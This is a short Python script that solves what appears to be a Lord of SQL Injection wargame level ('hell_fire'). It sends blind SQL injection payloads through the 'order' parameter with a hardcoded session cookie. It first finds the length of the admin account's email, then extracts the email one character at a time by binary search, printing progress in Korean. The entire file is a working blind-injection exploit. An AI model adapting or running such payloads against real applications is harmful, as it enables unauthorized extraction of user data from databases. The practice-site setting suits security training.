import requests

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
cookies = { "PHPSESSID" : "1ms9m95gi4sptlh1d1ljmndnbk" }

def email_length():
    length = 1

    while True:
        params = { "order" : "if(id='admin' and length(email)={}, 0, 1)".format(length) }
        request = requests.get(url, params=params, cookies=cookies)

        if "<th>score</th><tr><td>admin" in request.text:
            return length
        else:
            length += 1

def email_crack():
    emails_length = email_length()
    emails = ''

    for i in range(1, emails_length+1):
        start, end, mid = 1, 127, 64

        while True:
            params = { "order" : "if(hex(substring((select email where id='admin'),{},1)={}),0,1)".format(i, hex(mid)) }
            request = requests.get(url, params=params, cookies=cookies)
            
            if "<th>score</th><tr><td>admin" in request.text:
                emails = emails + chr(mid).lower()
                print("이메일:", emails)
                break
            else:
                params = { "order" : "if(hex(substring((select email where id='admin'),{},1)>{}),0,1)".format(i, hex(mid)) }
                request = requests.get(url, params=params, cookies=cookies)

                if "<th>score</th><tr><td>admin" in request.text:
                    start = mid
                    mid = (mid + end) // 2
                else:
                    end = mid
                    mid = (start + end) // 2

email_crack()
